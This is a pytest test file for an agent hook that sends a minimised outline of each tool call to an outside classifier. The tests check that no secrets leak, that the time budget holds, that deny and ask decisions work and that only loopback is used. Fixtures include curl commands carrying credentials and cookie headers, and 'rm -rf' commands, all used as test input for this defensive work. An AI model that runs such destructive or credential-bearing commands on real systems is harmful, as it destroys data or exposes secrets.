"""
The Jev router, rebuilt as an allowlist, tested against the ways it could leak
what it should not send or overrun its time.

Ruled by Tee 2026-10-16 (.claude/hooks/jev_route.py), held as PR #368, and on
2026-10-17 rebuilt as an allowlist on a card: "Hold it, rebuild as allowlist".
The held version scrubbed the raw call. This one builds the outbound text from
a short list of pieces (tool name, program names, flag names, file paths, field
names) and the tests below pin that nothing else is sent, whatever is put in the
call. They drive the hook against a stub server on 127.0.0.1 that answers in
the shape of TypeSafe's published OpenAPI spec, and pin the promises the module
docstring makes: it never prints allow, it fails open with a ledger row on every
call, a deny stands only once its ledger row is written, and the whole hook
stays inside its time budget on any input up to 1 MB.

They prove the hook's own logic and nothing about Jev's judgment, which only a
live call can measure.

Ruled by Tee 2026-10-28: the container never holds the TypeSafe key. It is a
network secret of the cloud environment and the agent proxy adds it to requests
for api.typesafe.ai. So the hook reads no key and sends no Authorization header,
its request has to go through the proxy the environment sets, and a module
constant SEND, shipped False, gates every request. These tests pin each of
those against loopback stubs and a loopback fake proxy only. No test makes a
request to api.typesafe.ai or to any outside host, and a guard that applies to
every test fails the test that tries: it refuses to resolve or connect to
anything but the loopback interface.

Ruled by Tee 2026-10-28 on a card, "Known commands only": a word the reader takes
for a program is sent only when it is a bash builtin or reserved word, a name
PATH resolves to an executable file, or a path to an existing executable file.
So every test runs with a PATH that is one temporary directory of empty
executables, and a row that names a program needs that program in INSTALLED. The
reader tests run twice, once with the secret not installed, which is the ordinary
machine, and once with the secret installed as a command, so the gate cannot be
what keeps a value out and the reader's own defences stay tested.

Standalone: no database, no network beyond loopback, no repository state
beyond the files.
"""

from __future__ import annotations

import ast
import http.server
import importlib.util
import io
import itertools
import json
import os
import pathlib
import random
import re
import shutil
import socket
import ssl
import string
import subprocess
import sys
import threading
import time
from datetime import datetime, timedelta, timezone

import pytest

try:
    import re._parser as sre_parse
except ImportError:  # pragma: no cover - Python before 3.11
    import sre_parse

ROOT = pathlib.Path(__file__).parent
HOOK = ROOT / ".claude" / "hooks" / "jev_route.py"
WRAPPER = (
    'python3 "$CLAUDE_PROJECT_DIR/.claude/hooks/jev_route.py"; rc=$?; '
    '[ $rc -eq 0 ] || { echo "jev_route hook failed rc=$rc" >&2; exit 1; }'
)


def fresh_module():
    spec = importlib.util.spec_from_file_location("jev_route_fresh", HOOK)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


jev = fresh_module()
SHIPPED_ENFORCE = jev.ENFORCE
SHIPPED_SEND = jev.SEND
NOW =datetime(2026, 10, 17, 18, 0, 0, tzinfo=timezone.utc)
DEAD = "http://127.0.0.1:9/v1/systemone"
MEGABYTE = 1024 * 1024
ORIGINAL_PATH = os.environ.get("PATH", "/usr/bin:/bin")


class Stub:
    """A loopback server that records each request and answers as told."""

    def __init__(self):
        self.requests = []
        self.reply = None
        self.delay = 0.0
        self.redirect_to = None
        self.answer(0.1, 0.1)
        stub = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def _send(self):
                length = int(self.headers.get("Content-Length", 0) or 0)
                raw_in = self.rfile.read(length) if length else b""
                stub.requests.append({"path": self.path, "method": self.command, "headers": dict(self.headers),
                                      "body": json.loads(raw_in) if raw_in else None})
                time.sleep(stub.delay)
                if stub.redirect_to and self.path.endswith("/v1/systemone"):
                    self.send_response(302)
                    self.send_header("Location", stub.redirect_to)
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                    return
                status, body = stub.reply
                raw = body if isinstance(body, bytes) else json.dumps(body).encode()
                self.send_response(status)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(raw)))
                self.end_headers()
                self.wfile.write(raw)

            do_POST = _send
            do_GET = _send

            def log_message(self, *args):
                pass

        class Quiet(http.server.ThreadingHTTPServer):
            """A client that gave up on a slow answer is the point of some tests."""

            def handle_error(self, request, client_address):
                pass

        self.server = Quiet(("127.0.0.1", 0), Handler)
        self.url = "http://127.0.0.1:%d/v1/systemone" % self.server.server_address[1]
        threading.Thread(target=self.server.serve_forever, kwargs={"poll_interval": 0.01}, daemon=True).start()

    def answer(self, better_tool, needs_human, model="jev-1.14.0"):
        self.reply = (200, answer_body(better_tool, needs_human, model))


def answer_body(better_tool, needs_human, model="jev-1.14.0"):
    return {
        "model": model,
        "answers": {
            "better_tool": {"type": "noul", "noul": better_tool},
            "needs_human": {"type": "noul", "noul": needs_human},
        },
        "usage": {"input_tokens": 120, "output_tokens": 2},
    }


@pytest.fixture
def stub():
    s = Stub()
    yield s
    s.server.shutdown()


def read_head(conn):
    """Bytes up to and including the blank line that ends an HTTP head."""
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = conn.recv(65536)
        if not chunk:
            break
        data += chunk
    return data


class FakeProxy:
    """A loopback HTTP proxy, so that the route of a request can be read without
    a request leaving the machine. It records the head of the first request on
    each connection, which for an https URL is the CONNECT line. Without a tls
    context it refuses the tunnel with a 502, so nothing goes further. Given one
    it accepts the tunnel and plays the origin inside it: it terminates TLS with
    the context's certificate, records the request it reads there and answers it."""

    def __init__(self, tls=None, reply=None):
        self.heads = []
        self.tunnelled = []
        self.tls = tls
        self.reply = reply or (200, answer_body(0.1, 0.1))
        self.listener = socket.socket()
        self.listener.bind(("127.0.0.1", 0))
        self.listener.listen(8)
        self.url = "http://127.0.0.1:%d" % self.listener.getsockname()[1]
        threading.Thread(target=self.accept_forever, daemon=True).start()

    def accept_forever(self):
        while True:
            try:
                conn, _ = self.listener.accept()
            except OSError:
                return
            threading.Thread(target=self.handle, args=(conn,), daemon=True).start()

    def handle(self, conn):
        try:
            conn.settimeout(5)
            self.heads.append(read_head(conn).decode("latin-1"))
            if self.tls is None:
                conn.sendall(b"HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
                return
            conn.sendall(b"HTTP/1.1 200 Connection established\r\n\r\n")
            with self.tls.wrap_socket(conn, server_side=True) as tunnel:
                head = read_head(tunnel)
                lines = head.decode("latin-1").split("\r\n")
                headers = {}
                for line in lines[1:]:
                    name, _, value = line.partition(":")
                    if name:
                        headers[name.strip().lower()] = value.strip()
                length = int(headers.get("content-length", 0) or 0)
                body = head.split(b"\r\n\r\n", 1)[1]
                while len(body) < length:
                    body += tunnel.recv(65536)
                self.tunnelled.append({"line": lines[0], "headers": headers, "body": json.loads(body) if body else None})
                status, answer = self.reply
                raw = json.dumps(answer).encode()
                tunnel.sendall(("HTTP/1.1 %d X\r\nContent-Type: application/json\r\nContent-Length: %d\r\n"
                                "Connection: close\r\n\r\n" % (status, len(raw))).encode() + raw)
        except (OSError, ssl.SSLError, ValueError):
            pass
        finally:
            conn.close()

    def connects(self):
        """The request line of every connection the proxy was asked to make."""
        return [head.split("\r\n")[0] for head in self.heads]

    def close(self):
        self.listener.close()


@pytest.fixture
def fake_proxy():
    made = []

    def make(**kw):
        made.append(FakeProxy(**kw))
        return made[-1]

    yield make
    for proxy in made:
        proxy.close()


PROXY_VARIABLES = ("http_proxy", "https_proxy", "all_proxy", "ftp_proxy", "no_proxy")


def route_through(monkeypatch, proxy):
    """Point the environment's HTTPS proxy at a fake one, in both spellings."""
    for name in list(os.environ):
        if name.lower() in PROXY_VARIABLES:
            monkeypatch.delenv(name)
    monkeypatch.setenv("HTTPS_PROXY", proxy.url)
    monkeypatch.setenv("https_proxy", proxy.url)


def proxy_env(proxy):
    """The environment of a child process whose HTTPS proxy is a fake one."""
    return {"HTTPS_PROXY": proxy.url, "https_proxy": proxy.url}


@pytest.fixture(autouse=True)
def the_hook_is_switched_on(monkeypatch):
    """The shipped SEND is False, which test_the_shipped_send_switch_is_off pins.
    Every other test needs the request path, so they run with it on, and a test of
    the off state turns it off again itself."""
    monkeypatch.setattr(jev, "SEND", True)


@pytest.fixture(autouse=True)
def no_environment_proxy(monkeypatch):
    """The suite does not depend on the proxy of the machine it runs on. The
    agent container sets HTTPS_PROXY to its real proxy, and a test that reached it
    would be a request to an outside host."""
    for name in list(os.environ):
        if name.lower() in PROXY_VARIABLES:
            monkeypatch.delenv(name)
    monkeypatch.setenv("no_proxy", "127.0.0.1,localhost")


@pytest.fixture(autouse=True)
def loopback_only(monkeypatch):
    """Nothing in this file resolves or connects to anything but the loopback
    interface. A name that is not loopback is refused and the test fails at the
    end, so a request to api.typesafe.ai cannot pass quietly as an error row."""
    refused = []
    real_getaddrinfo = socket.getaddrinfo
    real_connect = socket.socket.connect

    def loopback(host):
        return host in (None, "", "localhost", "127.0.0.1", "::1")

    def getaddrinfo(host, *args, **kwargs):
        if not loopback(host):
            refused.append(("resolve", host))
            raise socket.gaierror("refused by the test: not loopback")
        return real_getaddrinfo(host, *args, **kwargs)

    def connect(self, address):
        host = address[0] if isinstance(address, tuple) else address
        if not loopback(host):
            refused.append(("connect", host))
            raise OSError("refused by the test: not loopback")
        return real_connect(self, address)

    monkeypatch.setattr(socket, "getaddrinfo", getaddrinfo)
    monkeypatch.setattr(socket.socket, "connect", connect)
    yield refused
    assert not refused, refused


@pytest.fixture(autouse=True)
def project(tmp_path, monkeypatch):
    proj = tmp_path / "proj"
    proj.mkdir()
    (tmp_path / "home").mkdir()
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", str(proj))
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    return proj


@pytest.fixture
def home(tmp_path):
    return tmp_path / "home"


# The programs the rows below run. The hook sends a program name only when the
# machine has the program, so these are empty executables in one temporary
# directory that is the whole PATH of every test: no row depends on what is
# installed where the suite runs, and a program that is not here is not a command.
# The last group are names no machine has. A few rows need one to be a command so
# that the reader's own reading of it is what the row tests: a delimiter line EOF
# is a command bash runs when it sits inside a $( ), and run.sh and deploy.sh are
# scripts that rows run by name and by the path {bin}/run.sh.
# test_the_installed_programs_cover_every_program_the_reader_tests_name fails when
# a row needs a program that is not here, and this list holds no program no row runs.
INSTALLED = (
    "aws bash cat curl date dd docker doas env find gh git grep ls make mysql nohup printenv python3 python3.11 "
    "rm sed sh sha256sum sleep sort ssh sudo tar tee timeout watch which whoami xargs x86_64-linux-gnu-gcc "
    "EOF run.sh deploy.sh"
).split()


@pytest.fixture(scope="session")
def installed_bin(tmp_path_factory):
    return make_bin(tmp_path_factory.mktemp("installed"), INSTALLED)


@pytest.fixture(scope="session")
def secret_bin(tmp_path_factory):
    """Every value the tests hide, as the name of an installed command. A secret
    that is the name of a command does leave, and it is the one case where only the
    reader keeps it out of a program slot, which is what the reader tests need."""
    names = CANARIES + tuple(sorted(secret_words()))
    return make_bin(tmp_path_factory.mktemp("secrets"), names)


def make_bin(directory, names):
    for name in names:
        path = directory / name
        path.write_text("#!/bin/sh\nexit 0\n")
        path.chmod(0o755)
    return directory


@pytest.fixture(autouse=True)
def only_the_installed_programs(installed_bin, monkeypatch):
    monkeypatch.setenv("PATH", str(installed_bin))
    return installed_bin


@pytest.fixture(params=["secret not installed", "secret installed as a command"])
def secrets(request, installed_bin, secret_bin, monkeypatch):
    """Run a reader test on an ordinary machine and on one where the value is the
    name of a command. Both must keep the value out of the text."""
    if request.param.endswith("command"):
        monkeypatch.setenv("PATH", os.pathsep.join((str(installed_bin), str(secret_bin))))
    return request.param


@pytest.fixture
def enforce(monkeypatch):
    monkeypatch.setattr(jev, "ENFORCE", True)


def ledger(project):
    path = project / ".claude" / "ledger" / "jev-route.jsonl"
    return [json.loads(line) for line in path.read_text().splitlines()]


def payload(command="cat README.md", session="s1", tool="Bash", tool_input=None, cwd="/repo"):
    return {"session_id": session, "tool_name": tool, "cwd": cwd,
            "tool_input": tool_input if tool_input is not None else {"command": command}}


def go(stub, p=None, **kw):
    kw.setdefault("endpoint", stub.url)
    return jev.run(p or payload(), now=NOW, **kw)


def sent_text(stub):
    return stub.requests[-1]["body"]["state"]["tool_input"]


def sent_everything(stub):
    """The whole request body, questions and all, as one string."""
    return json.dumps(stub.requests[-1]["body"])


def sent_chars(stub):
    state = stub.requests[-1]["body"]["state"]
    return len(state["tool_name"]) + len(state["tool_input"])


def outline(command, cwd="/nonexistent-cwd", home="/home/nobody"):
    return jev.build_text("Bash", {"command": command}, cwd, home)


def decision(out):
    return out["hookSpecificOutput"]["permissionDecision"]


def run_main(monkeypatch, stdin_text, endpoint):
    monkeypatch.setattr(jev, "ENDPOINT", endpoint)
    monkeypatch.setattr("sys.stdin", io.StringIO(stdin_text))
    out = io.StringIO()
    monkeypatch.setattr("sys.stdout", out)
    rc = jev.main()
    return rc, out.getvalue()


# ------------------------------------------------- the acceptance tests


def test_curl_u_sends_the_program_and_the_flag_and_not_the_credential(stub):
    go(stub, payload(command="curl -u admin:hunter2 https://x.example"))
    assert sent_text(stub) == "curl -u"
    everything = sent_everything(stub)
    for fragment in ("hunter2", "admin", "x.example"):
        assert fragment not in everything


def test_curl_basic_auth_and_cookie_headers_send_no_header_value(stub):
    for command in ('curl -H "Authorization: Basic YWRtaW46aHVudGVy" https://x.example',
                    'curl -H "Cookie: session=abc123def456" https://x.example'):
        go(stub, payload(command=command))
        assert sent_text(stub) == "curl -H"
        everything = sent_everything(stub)
        for fragment in ("YWRtaW46aHVudGVy", "Basic", "abc123def456", "session", "Cookie", "Authorization"):
            assert fragment not in everything, (command, fragment)


def test_an_mcp_call_with_a_credential_field_sends_the_field_names_only(stub):
    go(stub, payload(tool="mcp__railway__set_variables", tool_input={"credential": "s3cr3tvalue", "token_name": "x"}))
    assert sent_text(stub) == "fields credential token_name"
    assert "s3cr3tvalue" not in sent_everything(stub)
    assert stub.requests[-1]["body"]["state"]["tool_name"] == "mcp__railway__set_variables"


LEAF = "a" * 250 + "key" + " " * 1247


def leaf_payloads():
    """Where the one-leaf input from the held version's finding can sit: a Bash
    command, a file body and an MCP field. Forty of them is the second case."""
    return {
        "mcp leaf": payload(tool="mcp__x__y", tool_input={"leaf": LEAF}),
        "mcp 40 leaves": payload(tool="mcp__x__y", tool_input={"k%d" % i: LEAF for i in range(40)}),
        "mcp list of 40": payload(tool="mcp__x__y", tool_input={"rows": [LEAF] * 40}),
        "bash leaf": payload(command="echo '%s'" % LEAF),
        "bash 40 leaves": payload(command=" ".join("--k%d='%s'" % (i, LEAF) for i in range(40))),
        "write leaf": payload(tool="Write", tool_input={"file_path": "/repo/a.txt", "content": LEAF}),
        "edit 40 leaves": payload(tool="Edit", tool_input={"file_path": "/repo/a.txt", "old_string": LEAF * 20,
                                                          "new_string": LEAF * 20}),
    }


@pytest.mark.parametrize("which", ["mcp leaf", "bash leaf", "write leaf"])
def test_one_pathological_leaf_finishes_under_a_second_and_writes_a_row(stub, project, monkeypatch, which):
    """The real input goes through main(), JSON and all. The row's hash is the
    hash of the full call, which is how this test knows the hook saw it."""
    p = leaf_payloads()[which]
    started = time.monotonic()
    rc, out = run_main(monkeypatch, json.dumps(p), stub.url)
    elapsed = time.monotonic() - started
    assert rc == 0 and out == ""
    assert elapsed < 1.0, elapsed
    row = ledger(project)[-1]
    assert row["outcome"] == "answered"
    assert row["input_sha"] == jev.input_digest(p["tool_name"], p["tool_input"])
    assert "aaaa" not in sent_everything(stub)


@pytest.mark.parametrize("which", ["mcp 40 leaves", "mcp list of 40", "bash 40 leaves", "edit 40 leaves"])
def test_forty_pathological_leaves_finish_under_a_second_and_write_a_row(stub, project, monkeypatch, which):
    p = leaf_payloads()[which]
    assert len(json.dumps(p)) > 40 * 1500
    started = time.monotonic()
    rc, out = run_main(monkeypatch, json.dumps(p), stub.url)
    elapsed = time.monotonic() - started
    assert rc == 0 and out == ""
    assert elapsed < 1.0, elapsed
    row = ledger(project)[-1]
    assert row["outcome"] == "answered"
    assert row["input_sha"] == jev.input_digest(p["tool_name"], p["tool_input"])
    assert "aaaa" not in sent_everything(stub)


MB = MEGABYTE
ONE_MEGABYTE_COMMANDS = {
    "one word": lambda: "a" * MB,
    "many words": lambda: "x " * (MB // 2),
    "flags": lambda: "ls -la " * (MB // 7),
    "lines of commands": lambda: "ls -la\n" * (MB // 7),
    "programs": lambda: "ls;" * (MB // 3),
    "one quoted string": lambda: "echo '" + "q" * MB + "'",
    "unterminated single quote": lambda: "echo '" + "q " * (MB // 2),
    "unterminated double quote": lambda: 'echo "' + "q " * (MB // 2),
    "heredoc body": lambda: "cat <<EOF\n" + "secret line\n" * (MB // 12) + "EOF\nls",
    "unterminated heredoc": lambda: "cat <<EOF\n" + "x\n" * (MB // 2),
    "substitutions": lambda: "$( " * (MB // 3),
    "backslashes": lambda: "\\ " * (MB // 2),
    "dollars": lambda: "$ " * (MB // 2),
    "backticks": lambda: "` " * (MB // 2),
    "double quote specials": lambda: '" ' + "\\$ " * (MB // 3) + '"',
    "assignments": lambda: "A=b " * (MB // 4),
    "redirects": lambda: ">x " * (MB // 3),
    "paths": lambda: "cat " + "./a " * (MB // 4),
    "newlines": lambda: "\n" * MB,
    "mixed": lambda: "a='b' \"c\" $d `e` ;f|g&h <i >j (k) " * (MB // 36),
    # The regions the reader skips without looking in, closed and not closed.
    "test expression": lambda: "[[ " + "a " * (MB // 2) + "]] && ls",
    "unterminated test expression": lambda: "[[ " + "a " * (MB // 2),
    "many test expressions": lambda: "[[ a ]] && " * (MB // 11),
    "array literal": lambda: "A=(" + "a 'b c' " * (MB // 8) + ") ls",
    "unterminated array literal": lambda: "A=(" + "a " * (MB // 2),
    "many array literals": lambda: "A=(a) " * (MB // 6),
    "arithmetic": lambda: "echo $((" + "1 + " * (MB // 4) + "1)) && ls",
    "unterminated arithmetic": lambda: "echo $((" + "(" * (MB // 2),
    "many arithmetic": lambda: "x=$((1<<2)) " * (MB // 12),
    "parameter expansion": lambda: "echo ${X:-" + "a " * (MB // 2) + "} && ls",
    "unterminated parameter expansion": lambda: "echo ${X:-" + "a " * (MB // 2),
    "many parameter expansions": lambda: "echo ${X} " * (MB // 10),
    # What the second round of fixes reads or stops at.
    "ampersand redirects": lambda: "ls &>x " * (MB // 7),
    "ampersand redirects with targets": lambda: "ls &>> x y " * (MB // 11),
    "ampersand then continuation": lambda: "ls &\\\n" * (MB // 6),
    "continuations": lambda: "\\\n" * (MB // 2),
    "continuations after an ampersand": lambda: "ls &" + "\\\n" * (MB // 2),
    "quoted assignments": lambda: '"A=1" ' * (MB // 6),
    "assignment then keyword": lambda: "A=1 if " * (MB // 7),
    "redirect then keyword": lambda: ">x if " * (MB // 6),
    "carriage returns": lambda: "a\r" * (MB // 2),
    "legacy arithmetic": lambda: "echo $[" + "1 + " * (MB // 4) + "]",
    "many legacy arithmetic": lambda: "echo $[1] " * (MB // 10),
    "continuation inside an operator": lambda: "cat <\\\n<EOF\n" + "x\n" * (MB // 2),
    "ansi string": lambda: "echo $'" + "a\\'" * (MB // 3) + "' && ls",
    "unterminated ansi string": lambda: "echo $'" + "a\\'" * (MB // 3),
    "deep substitutions": lambda: "echo " + "$(echo " * (MB // 7),
    "substitutions in double quotes": lambda: 'echo "' + "$(echo a) " * (MB // 10) + '"',
    "backticks in double quotes": lambda: 'echo "' + "`echo a` " * (MB // 9) + '"',
    # What the third round reads: a continuation in the body of a here-document is
    # joined to the line after it, and a joined line can be as long as the body.
    "heredoc lines that continue": lambda: "cat <<EOF\n" + "a\\\n" * (MB // 3) + "EOF\nls",
    "heredoc lines of one backslash": lambda: "cat <<EOF\n" + "\\\n" * (MB // 2) + "EOF\nls",
    "heredoc lines of long backslash runs": lambda: "cat <<EOF\n" + ("\\" * 999 + "\n") * (MB // 1000),
    "heredoc lines that continue, tabbed": lambda: "cat <<-EOF\n" + "\ta\\\n" * (MB // 4) + "\tEOF\nls",
    "many heredocs that continue": lambda: "cat <<EOF\na\\\nEOF\nEOF\n" * (MB // 22),
    "continuations between words": lambda: "ls \\\n" * (MB // 5),
    "continuations inside a word": lambda: "e\\\n" * (MB // 3),
    "continuations before a keyword": lambda: "true && \\\n[[ a ]] " * (MB // 18),
    "continuations before a redirect operand": lambda: "ls > \\\n" * (MB // 7),
    "continuations inside parentheses": lambda: "(\\\n(a)) " * (MB // 8),
    "delimiters with an expansion": lambda: "cat <<$'EOF'\n" * (MB // 13),
    "bare case words": lambda: "echo case " * (MB // 10),
    "bare test words": lambda: "echo [[ " * (MB // 8),
    # What round 5 reads or stops at: a subscript is scanned to its matching bracket,
    # and a comment, an ANSI string or a here-document body inside backticks ends the read.
    "many subscripts": lambda: "m[a]=1 " * (MB // 7),
    "many subscripts, one command each": lambda: "m[a]=1;" * (MB // 7),
    "many subscripts that do not close": lambda: "m[a " * (MB // 3),
    "one subscript opened for ever": lambda: "m" + "[" * MB,
    "one long closed subscript": lambda: "m[" + "[]" * (MB // 2) + "]=1 && ls",
    "many subscripts after a keyword": lambda: "if m[a]=1; then " * (MB // 16),
    "comments in backticks": lambda: "echo `echo a # b\n` " * (MB // 20),
    "here-document bodies in backticks": lambda: "echo `cat <<EOF\n" + "x\\\n" * (MB // 3),
    "ansi strings in backticks": lambda: "echo `echo $'a\\\\'` " * (MB // 20),
    "delimiters that run into a process substitution": lambda: "cat <<EOF<(" * (MB // 11),
    "delimiters that run into a process substitution, after a blank": lambda: "cat << <(" * (MB // 9),
}


@pytest.mark.parametrize("shape", sorted(ONE_MEGABYTE_COMMANDS))
def test_a_one_megabyte_bash_command_finishes_under_2_5_seconds_and_sends_at_most_2000_characters(
        stub, project, monkeypatch, shape):
    command = ONE_MEGABYTE_COMMANDS[shape]()[:MEGABYTE]
    p = payload(command=command)
    started = time.monotonic()
    rc, out = run_main(monkeypatch, json.dumps(p), stub.url)
    elapsed = time.monotonic() - started
    assert rc == 0 and out == ""
    assert elapsed < 2.5, elapsed
    assert sent_chars(stub) <= 2000
    assert len(json.dumps(stub.requests[-1]["body"])) < 8000, "nothing of the command passes through whole"
    row = ledger(project)[-1]
    assert row["outcome"] == "answered"
    assert row["input_sha"] == jev.input_digest("Bash", p["tool_input"]), "the hook saw the whole command"


def test_the_cap_is_2000_characters_cut_at_a_piece_boundary(stub):
    go(stub, payload(command="ls -la\n" * 150000))
    text = sent_text(stub)
    assert jev.MAX_OUT - 12 <= sent_chars(stub) <= jev.MAX_OUT
    assert {line for line in text.split("\n")} == {"ls -la"}, "the last line is whole"
    go(stub, payload(command="ls -la " * 150000))
    assert set(sent_text(stub).split()) <= {"ls", "-la"} and sent_chars(stub) <= jev.MAX_OUT


# The loopback guard of loopback_only, for a child process. A child cannot be
# reached by a fixture, and a hook that went around its proxy from a child would be
# a request to an outside host, so every child starts with the guard in place.
CHILD_GUARD = (
    "import socket\n"
    "_resolve, _connect = socket.getaddrinfo, socket.socket.connect\n"
    "_loopback = (None, '', 'localhost', '127.0.0.1', '::1')\n"
    "def _getaddrinfo(host, *args, **kwargs):\n"
    "    if host not in _loopback:\n"
    "        raise socket.gaierror('refused by the test: not loopback')\n"
    "    return _resolve(host, *args, **kwargs)\n"
    "def _guarded(self, address):\n"
    "    if (address[0] if isinstance(address, tuple) else address) not in _loopback:\n"
    "        raise OSError('refused by the test: not loopback')\n"
    "    return _connect(self, address)\n"
    "socket.getaddrinfo = _getaddrinfo\n"
    "socket.socket.connect = _guarded\n"
)


def child_env(project, extra_env=None):
    return {"CLAUDE_PROJECT_DIR": str(project), "HOME": os.environ["HOME"],
            "PATH": os.environ.get("PATH", "/usr/bin:/bin"), **(extra_env or {})}


def run_in_a_process(project, stub_url, stdin_text, extra_env=None):
    """The harness's path: a new interpreter, the payload on stdin, the exit
    code and stdout read back. The endpoint is swapped and SEND is switched on, in
    a driver, because the shipped file is off and the hook reads nothing from its
    environment but the project directory and PATH. extra_env is for the proxy
    variables that urllib itself reads."""
    driver = CHILD_GUARD + (
        "import importlib.util, sys\n"
        "spec = importlib.util.spec_from_file_location('jev_route_child', sys.argv[1])\n"
        "m = importlib.util.module_from_spec(spec)\n"
        "spec.loader.exec_module(m)\n"
        "m.ENDPOINT = sys.argv[2]\n"
        "m.SEND = True\n"
        "sys.exit(m.main())\n"
    )
    started = time.monotonic()
    proc = subprocess.run([sys.executable, "-c", driver, str(HOOK), stub_url], input=stdin_text,
                          capture_output=True, text=True, env=child_env(project, extra_env), timeout=30)
    return proc, time.monotonic() - started


def run_the_shipped_file(project, stdin_text, extra_env=None):
    """The file as it ships, with nothing swapped, run as the script it is: its own
    __main__ block, under the loopback guard."""
    driver = CHILD_GUARD + (
        "import runpy, sys\n"
        "runpy.run_path(sys.argv[1], run_name='__main__')\n"
    )
    return subprocess.run([sys.executable, "-c", driver, str(HOOK)], input=stdin_text, capture_output=True,
                          text=True, env=child_env(project, extra_env), timeout=30)


def test_a_one_megabyte_command_through_a_real_process_stays_inside_the_budget(stub, project):
    p = payload(command=("ls -la " + "x" * 500 + "\n") * (MEGABYTE // 510))
    stdin_text = json.dumps(p)
    assert len(stdin_text) > MEGABYTE * 0.99
    proc, elapsed = run_in_a_process(project, stub.url, stdin_text)
    assert proc.returncode == 0 and proc.stdout == "", proc.stderr
    assert elapsed < 2.5, elapsed
    assert ledger(project)[-1]["outcome"] == "answered"


def test_the_whole_process_stays_inside_the_budget_when_jev_never_answers(stub, project):
    """The request gets what is left of HOOK_BUDGET_S, so a vendor that hangs
    costs the budget and not the 5 second timeout."""
    stub.delay = 8.0
    stdin_text = json.dumps(payload(command="ls -la " * (MEGABYTE // 7)))
    proc, elapsed = run_in_a_process(project, stub.url, stdin_text)
    assert proc.returncode == 0 and proc.stdout == "", proc.stderr
    assert elapsed < jev.HOOK_BUDGET_S, elapsed
    row = ledger(project)[-1]
    assert row["outcome"] == "error" and row["error"] == "TimeoutError"


def test_the_request_gets_what_is_left_of_the_budget(stub, project):
    stub.delay = 8.0
    started = time.monotonic()
    out = jev.run(payload(), endpoint=stub.url, now=NOW, started=time.monotonic() - 1.5)
    assert out is None
    assert time.monotonic() - started < 1.0, "1.5 s of the budget was already spent"
    assert ledger(project)[-1]["error"] == "TimeoutError"


def test_a_deny_on_one_call_does_not_pass_a_different_call(stub, project, enforce):
    """Two calls that read the same to Jev are still two calls. Dropping the
    input hash match in denied_before makes the second one pass unasked."""
    stub.answer(0.95, 0.0)
    first = payload(command="rm -rf build")
    other = payload(command="rm -rf dist")
    assert outline("rm -rf build") == outline("rm -rf dist"), "the test needs two calls with one outline"
    assert decision(go(stub, first)) == "deny"
    assert decision(go(stub, other)) == "deny"
    assert len(stub.requests) == 2
    assert [r["outcome"] for r in ledger(project)] == ["answered", "answered"]
    assert go(stub, first) is None, "the identical call is the one that passes"
    assert ledger(project)[-1]["outcome"] == "repeat_pass"
    assert len(stub.requests) == 2


def test_a_deny_does_not_pass_the_same_call_in_another_session(stub, enforce):
    stub.answer(0.95, 0.0)
    assert decision(go(stub, payload(session="s1"))) == "deny"
    assert decision(go(stub, payload(session="s2"))) == "deny"
    assert len(stub.requests) == 2


def test_an_ask_is_asked_again_on_the_identical_call(stub, project, enforce):
    """Only a deny is let through the second time. Treating an ask as a deny
    would let a step that changes something outside the repository through
    after one question."""
    stub.answer(0.0, 0.95)
    for _ in range(3):
        assert decision(go(stub)) == "ask"
    assert len(stub.requests) == 3
    assert [r["outcome"] for r in ledger(project)] == ["answered"] * 3


def idle_rows():
    stamp = jev.stamp(NOW)
    return [
        {"ts": stamp, "outcome": "off"},
        {"ts": stamp, "outcome": "repeat_pass"},
        {"ts": stamp, "outcome": "breaker_open"},
        {"ts": stamp, "outcome": "bad_input"},
        {"ts": stamp, "outcome": "crash", "error": "RuntimeError"},
        {"ts": stamp, "outcome": "error", "error": "endpoint refused"},
    ]


def test_a_row_that_made_no_request_neither_closes_nor_breaks_the_failure_streak():
    failure = {"ts": jev.stamp(NOW), "outcome": "error", "latency_ms": 5, "error": "TimeoutError"}
    answered = {"ts": jev.stamp(NOW), "outcome": "answered", "latency_ms": 5}
    for idle in idle_rows():
        assert jev.breaker_open([failure, failure, idle, failure], NOW), ("breaks the streak", idle)
        assert jev.breaker_open([failure, idle, failure, idle, failure], NOW), ("breaks the streak", idle)
        assert not jev.breaker_open([failure, failure, idle], NOW), ("counts as a failure", idle)
        assert not jev.breaker_open([failure, idle, failure], NOW), ("counts as a failure", idle)
    assert not jev.breaker_open([failure, failure, answered, failure], NOW), "an answer closes the streak"
    assert jev.breaker_open([failure, failure, failure], NOW)


def test_an_off_row_between_failures_does_not_reset_the_streak(project, monkeypatch):
    for _ in range(2):
        jev.run(payload(), endpoint=DEAD, now=NOW, timeout=0.5)
    monkeypatch.setattr(jev, "SEND", False)
    jev.run(payload(), endpoint=DEAD, now=NOW)
    monkeypatch.setattr(jev, "SEND", True)
    assert ledger(project)[-1]["outcome"] == "off"
    jev.run(payload(), endpoint=DEAD, now=NOW, timeout=0.5)
    jev.run(payload(), endpoint=DEAD, now=NOW, timeout=0.5)
    assert [r["outcome"] for r in ledger(project)] == ["error", "error", "off", "error", "breaker_open"]


# ------------------------------------------------------ what it decides


def test_the_shipped_mode_is_shadow():
    """Flipping this takes a ruling and a commit."""
    assert SHIPPED_ENFORCE is False


def test_the_shipped_send_switch_is_off():
    """Turning the hook on is Tee's ruling and a one line commit, so the shipped
    value is pinned the way ENFORCE is, from the module as it was loaded and before
    any fixture of this file touches it. The line is pinned as well, so that a
    later assignment in the module cannot turn it on behind the constant."""
    assert SHIPPED_SEND is False
    assert re.findall(r"^SEND\s*[:=].*$", HOOK.read_text(), re.M) == ["SEND = False"]


def test_the_shipped_numbers_are_the_ones_claude_md_states():
    assert (jev.CONFIDENCE, jev.HOOK_BUDGET_S, jev.MAX_OUT, jev.MAX_PATH, jev.MAX_SCAN) == (0.8, 2.5, 2000, 200, 65536)
    assert (jev.BREAKER_ERRORS, jev.BREAKER_S) == (3, 600)
    assert jev.MAX_NEST == 8 and len(WRAPPERS) == 14
    assert (jev.MAX_WORD, jev.MAX_LOOKUPS) == (64, 128)
    section = (ROOT / "CLAUDE.md").read_text().split("## The Jev router")[1].split("\n## ")[0]
